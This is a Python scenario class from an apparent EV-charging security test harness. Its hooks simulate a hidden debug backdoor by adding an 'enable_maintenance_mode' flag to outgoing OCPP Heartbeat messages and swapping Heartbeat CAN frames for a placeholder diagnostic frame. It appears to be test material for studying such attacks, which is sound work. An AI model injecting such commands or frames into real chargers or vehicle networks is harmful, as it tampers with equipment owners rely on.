from infra.scenario_base import ScenarioHooks

class Scenario(ScenarioHooks):
    """
    Hidden Debug Backdoor via Heartbeat Messages.

    Attack Model:
    - Detect outgoing Heartbeat OCPP messages
    - Inject hidden debug command into payload
    - Inject a malicious CAN diagnostic frame
    """

    def pre_ocpp(self, action, payload):
        # Trigger only on Heartbeat
        if action == "Heartbeat":
            self.log("[ATTACK] Heartbeat detected → injecting debug flag")
            payload["debug"] = "enable_maintenance_mode"
        return action, payload

    def post_ocpp(self, action, payload, reply):
        # Nothing to modify after receiving the server's reply
        return reply

    def pre_can(self, can_frame):
        # Only trigger when sending CAN for Heartbeat
        if can_frame and can_frame["id"] == 0x100:  # Heartbeat CAN ID
            self.log("[ATTACK] Injecting hidden CAN diagnostic frame")
            return {
                "id": 0x555,
                "data": [0xDE, 0xAD, 0xBE, 0xEF]
            }
        return can_frame

    def post_can(self, can_frame):
        # Log the frame that was finally sent
        self.log(f"[INFO] Final CAN frame sent: {can_frame}")
        pass
